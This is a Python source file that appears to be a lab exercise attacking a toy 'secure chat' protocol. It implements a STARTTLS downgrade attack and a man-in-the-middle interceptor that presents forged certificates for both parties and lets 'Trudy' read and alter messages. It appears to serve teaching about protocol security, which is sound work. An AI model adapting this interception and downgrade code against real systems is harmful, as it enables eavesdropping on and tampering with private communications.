import sys
import socket
import time
import ssl

class Downgrade:
    """ Class for Downgrade attack
    """
    def __init__(self, client_name, server_name, port):
        """ init

        Args:
            client_name (string): client name
            server_name (string): server name
            port (string): port number
        """
        self.client_name = client_name
        self.server_name = server_name
        self.port = int(port)
        self.intercept_ip = socket.gethostbyname(self.server_name)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        self.socket.bind((socket.gethostname(), self.port))
        self.socket.listen()
        print("Trudy> Started listening")
        
        self.connection, client_address = self.socket.accept()
        self.client_name = socket.gethostbyaddr(client_address[0])[0]
        
        self.intercept_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.intercept_socket.connect((self.intercept_ip, self.port))
        print(f"======================= Intercepting chat between {self.server_name} and {self.client_name} =======================")
        self.intercept()        # intercepting the chat
        
    def intercept(self):
        """intercepting the connection between client and server
        """
        while True:
            # Alice talking
            message = self.connection.recv(1024).decode('UTF-8')
            
            if message == "chat_STARTTLS":  # if it is chat_STARTTLS
                print("Alice> ", message)
                time.sleep(0.8)
                self.intercept_socket.sendall("chat_STARTNOTLS".encode('UTF-8'))    # sending chat_STARTNOTLS, indicating server to open Non TLS Connection
                print("Trudy> Detected chat_STARTTLS and downgraded it to NO TLS")
            
            elif message == "chat_close":   # closing the socket
                print("Alice closed the chat")
                self.intercept_socket.sendall(message.encode('UTF-8'))
                self.connection.shutdown(socket.SHUT_RDWR)
                self.connection.close()
                return
                
            else:
                print("Alice> ", message)
                self.intercept_socket.sendall(message.encode('UTF-8'))
            
            # Bob talking
            message = self.intercept_socket.recv(1024).decode('UTF-8')
            
            if message == "chat_close":   # closing the socket
                print("Bob closed the chat")
                self.connection.sendall(message.encode('UTF-8'))
                self.intercept_socket.shutdown(socket.SHUT_RDWR)
                self.intercept_socket.close()
                return
            
            else:
                print("Bob> ", message)
                self.connection.sendall(message.encode('UTF-8'))
                
class MITM():
    """ Class for MiTM attack
    """
    def __init__(self, client_name, server_name, port):
        """ init

        Args:
            client_name (string): client name
            server_name (string): server name
            port (string): port number
        """
        self.client_name = client_name
        self.server_name = server_name
        self.port = int(port)
        self.intercept_ip = socket.gethostbyname(self.server_name)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        self.socket.bind((socket.gethostname(), self.port))
        self.socket.listen()
        print("Trudy> Started listening")
        
        self.connection, client_address = self.socket.accept()
        self.client_name = socket.gethostbyaddr(client_address[0])[0]
        
        self.intercept_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.intercept_socket.connect((self.intercept_ip, self.port))
        print(f"======================= Intercepting chat between {self.server_name} and {self.client_name} =======================")
        self.intercept()        # intercepting the chat        
    
    def intercept(self):
        """intercepting the connection between client and server
        """
        # exchanging chat_hello, chat_reply
        message = self.connection.recv(1024).decode('UTF-8')
        print("Alice> ", message)
        
        if message == "chat_hello":
            self.connection.sendall("chat_reply".encode('UTF-8'))
            
        self.intercept_socket.sendall("chat_hello".encode('UTF-8'))
        response = self.intercept_socket.recv(1024).decode('UTF-8')
        print("Bob> ", response)
        
        while True:
            # Alice talking
            message = self.connection.recv(1024).decode('UTF-8')
            
            if message == "chat_STARTTLS":
                # if the message is chat_STARTTLS, Trudy send fake bob's certificate
                print("Alice> ", message)
                print("Trudy> Detected chat_STARTTLS and sending fake certificates of Bob")
                self.connection.sendall("chat_STARTTLS_ACK".encode('UTF-8'))    # Trudy sending the ACK
                
                # exchanging client, server hello's
                response = self.connection.recv(1024).decode('UTF-8')
                if response == "client_hello":
                    print("Bob> Recieved client_hello \nBob> Sending server_hello")
                    self.connection.sendall("server_hello".encode('UTF-8'))
                else:
                    print("Bob> TLS Handshake failed")
                    self.connection.close()
                    return
                
                # wrapping the socket with fake server certs
                context = self.context_init(certfile = "./fakebob/fakebob.crt", keyfile = "./fakebob/fakebob.key")  # Opening a TLS Pipe b/w ALice and Trudy
                secure_socket = context.wrap_socket(self.connection, server_side = True)
                self.connection = secure_socket
                self.intercept_socket.sendall(message.encode('UTF-8'))          # Sending the recieved message to Bob
            
            elif message == "chat_close":       # closing the socket
                print("Alice closed the chat")
                self.intercept_socket.sendall(message.encode('UTF-8'))
                self.connection.shutdown(socket.SHUT_RDWR)
                self.connection.close()
                return
            
            elif message == "Server Certificate Verification is done":
                print("Alice> ", message)
                self.intercept_socket.sendall(message.encode('UTF-8'))
                  
            else:
                print("Alice> ", message)
                # checking if Trudy wants to modify the message sent by client
                do_modify = input("Do you want to modify the message Trudy (Y/N)? ")
                if do_modify == "Y":
                    message = input("Modified Message: ")
                
                self.intercept_socket.sendall(message.encode('UTF-8'))
            
            # Bob talking
            message = self.intercept_socket.recv(1024).decode('UTF-8')
            
            if message == "chat_close":       # closing the socket
                print("Bob closed the chat")
                self.connection.sendall(message.encode('UTF-8'))
                self.intercept_socket.shutdown(socket.SHUT_RDWR)
                self.intercept_socket.close()
                return
            
            elif message == "Client Certificate Verification is done":
                print("Bob> ", message)
                self.connection.sendall(message.encode('UTF-8'))
                
            elif message == "chat_STARTTLS_ACK":
                # if the message is chat_STARTTLS_ACK, Trudy send fake alice's certificate
                print("Alice> Sending client_hello")
                
                # exchanging client, server hello's
                self.intercept_socket.sendall("client_hello".encode('UTF-8'))
                response = self.intercept_socket.recv(1024).decode('UTF-8')
                
                if response!= "server_hello":
                    print("Alice> TLS Handshake failed")
                    self.socket.close()
                    return 
                
                print("Alice> server_hello recieved, verfying certificates")
                
                # wrapping the socket with fake server certs
                context = self.context_init(certfile = "./fakealice/fakealice.crt", keyfile = "./fakealice/fakealice.key")  # Opening a TLS Pipe b/w Bob and Trudy
                secure_socket = context.wrap_socket(self.intercept_socket, server_hostname = self.server_name)
                self.intercept_socket = secure_socket
                
            else:
                print("Bob> ", message)
                # checking if Trudy wants to modify the message sent by server
                do_modify = input("Do you want to modify the message Trudy (Y/N)? ")
                if do_modify == "Y":
                    message = input("Modified Message: ")
                
                self.connection.sendall(message.encode('UTF-8'))
                
    def context_init(self, certfile, keyfile):
        """ Initializes the context

        Args:
            certfile (string): file path of certfile
            keyfile (string): file path of keyfile

        Returns:
            context
        """
        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
        context.load_verify_locations("./rootCA/root.crt")
        context.verify_mode = ssl.CERT_REQUIRED
        context.load_cert_chain(certfile = certfile, keyfile = keyfile)
        context.options = ssl.OP_NO_TLSv1_2 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1 | ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 
        return context
            
def main():
    arg_len = len(sys.argv)
    
    if (arg_len) < 2:
        print ("secure_chat_interceptor.py -d <clientname> <servername> <port>/secure_chat_interceptor.py -m <clientname> <servername> <port>")
        sys.exit()
        
    if sys.argv[1] == '-d':
        if arg_len < 5:
            print ("Compulsory arguments for launching downgrade attack are not given. Please check: \nsecure_chat_interceptor.py -d <clientname> <servername> <port>")
            sys.exit()
        else:
            print("Launching downgrade attack!")
            Downgrade(sys.argv[2], sys.argv[3], sys.argv[4])
    
    elif sys.argv[1] == '-m':
        if arg_len < 5:
            print ("Compulsory arguments for launching MITM attack are not given. Please check: \nsecure_chat_interceptor.py -m <clientname> <servername> <port>")
            sys.exit()
        else:
            MITM(sys.argv[2], sys.argv[3], sys.argv[4])
            
    else:
        print ("secure_chat_interceptor.py -d <clientname> <servername> <port>/secure_chat_interceptor.py -m <clientname> <servername> <port>")
        sys.exit()
            
main()

